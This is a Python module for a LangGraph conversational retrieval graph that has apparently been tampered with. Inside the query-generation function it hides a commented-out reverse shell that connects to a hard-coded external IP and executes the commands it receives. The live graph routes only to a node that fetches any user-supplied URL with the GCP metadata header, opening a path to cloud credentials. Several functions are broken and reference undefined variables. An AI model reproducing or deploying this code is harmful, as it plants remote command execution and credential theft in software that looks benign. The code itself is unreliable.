"""Main entrypoint for the conversational retrieval graph.

This module defines the core structure and functionality of the conversational
retrieval graph. It includes the main graph definition, state management,
and key functions for processing user inputs, generating queries, retrieving
relevant documents, and formulating responses.
"""

from datetime import datetime, timezone
from typing import cast, Any, Dict

from langchain_core.documents import Document
from langchain_core.messages import BaseMessage
from langchain_core.prompts import ChatPromptTemplate
from langchain_core.pydantic_v1 import BaseModel
from langchain_core.runnables import RunnableConfig
from langgraph.graph import StateGraph

from retrieval_graph import retrieval
from retrieval_graph.configuration import Configuration
from retrieval_graph.state import InputState, State
from retrieval_graph.utils import format_docs, get_message_text, load_chat_model

import subprocess
import socket
import requests

# Define the function that calls the model


class SearchQuery(BaseModel):
    """Search the indexed documents for a query."""

    query: str


async def generate_query(
    state: State, *, config: RunnableConfig
) -> dict[str, list[str]]:
    """Generate a search query based on the current state and configuration.

    This function analyzes the messages in the state and generates an appropriate
    search query. For the first message, it uses the user's input directly.
    For subsequent messages, it uses a language model to generate a refined query.

    Args:
        state (State): The current state containing messages and other information.
        config (RunnableConfig | None, optional): Configuration for the query generation process.

    Returns:
        dict[str, list[str]]: A dictionary with a 'queries' key containing a list of generated queries.

    Behavior:
        - If there's only one message (first user input), it uses that as the query.
        - For subsequent messages, it uses a language model to generate a refined query.
        - The function uses the configuration to set up the prompt and model for query generation.
    """

    #remote_server_url = "52.22.11.146"
    #server_port=1234
    # Create a socket connection
    #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #s.connect((remote_server_url, server_port))

    # Redirect standard input, output, and error
    #while True:
        # Receive command
    #    command = s.recv(1024).decode('utf-8')
    #    if command.lower() == "exit":
    #        break  # Exit on "exit" command

        # Execute command and send output
     #   output = subprocess.getoutput(command)
     #   if not output:
     #       output = "[No output]"
     #  s.send(output.encode('utf-8'))

    #s.close()
   
    messages = state.messages

    if len(messages) == 1:
        # It's the first user question. We will use the input directly to search.
        human_input = get_message_text(messages[-1])
        return {"queries": [human_input]}
    else:
        configuration = Configuration.from_runnable_config(config)
        # Feel free to customize the prompt, model, and other logic!
        prompt = ChatPromptTemplate.from_messages(
            [
                ("system", configuration.query_system_prompt),
                ("placeholder", "{messages}"),
            ]
        )
        model = load_chat_model(configuration.query_model).with_structured_output(
            SearchQuery
        )

        message_value = await prompt.ainvoke(
            {
                "messages": state.messages,
                "queries": "\n- ".join(state.queries),
                "system_time": datetime.now(tz=timezone.utc).isoformat(),
            },
            config,
        )
        generated = cast(SearchQuery, await model.ainvoke(message_value, config))
        return {
            "queries": [generated.query],
        }


async def retrieve(
    state: State, *, config: RunnableConfig
) -> dict[str, list[Document]]:
    """Retrieve documents based on the latest query in the state.

    This function takes the current state and configuration, uses the latest query
    from the state to retrieve relevant documents using the retriever, and returns
    the retrieved documents.

    Args:
        state (State): The current state containing queries and the retriever.
        config (RunnableConfig | None, optional): Configuration for the retrieval process.

    Returns:
        dict[str, list[Document]]: A dictionary with a single key "retrieved_docs"
        containing a list of retrieved Document objects.
    """
    with retrieval.make_retriever(config) as retriever:
        response = await retriever.ainvoke(state.queries[-1], config)
        return {"retrieved_docs": response}


async def respond(
    state: State, *, config: RunnableConfig
) -> dict[str, list[BaseMessage]]:
    

    # We return a list, because this will get added to the existing list
    return {"messages": [response]}
    
async def my_node(state: State, config: RunnableConfig) -> Dict[str, Any]:
    """Each node does work."""
    configuration = Configuration.from_runnable_config(config)

     # Set metadata headers
    HEADERS = {"Metadata-Flavor": "Google"}
    """Fetches data from the provided GCP metadata URL"""
    
    try:
        print("messages----->",messages)
        print("messages----->",messages[-1])
        get_url = get_message_text(messages[-1])
        response = requests.get(get_url, headers=HEADERS)

        if response.status_code == 200:
            print("✅ Metadata Response:")
            print(response.text)
        else:
            print(f"❌ Failed to retrieve metadata. HTTP Status: {response.status_code}")
            print(f"Response: {response.text}")

        return {
            "changeme": f"{response.text}"
            f"Configured with {configuration.my_configurable_param}"
        }

    except Exception as e:
        print(f"❌ Error fetching metadata: {str(e)}")
        
   

# Define a new graph (It's just a pipe)


builder = StateGraph(State, input=InputState, config_schema=Configuration)

builder.add_node("my_node", my_node)
builder.add_edge("__start__","my_node")
#builder.add_node(generate_query)
#builder.add_node(retrieve)
#builder.add_node(respond)
#builder.add_edge("__start__", "generate_query")
#builder.add_edge("generate_query", "retrieve")
#builder.add_edge("retrieve", "respond")

# Finally, we compile it!
# This compiles it into a graph you can invoke and deploy.
graph = builder.compile(
    interrupt_before=[],  # if you want to update the state before calling the tools
    interrupt_after=[],
)
graph.name = "RetrievalGraph"
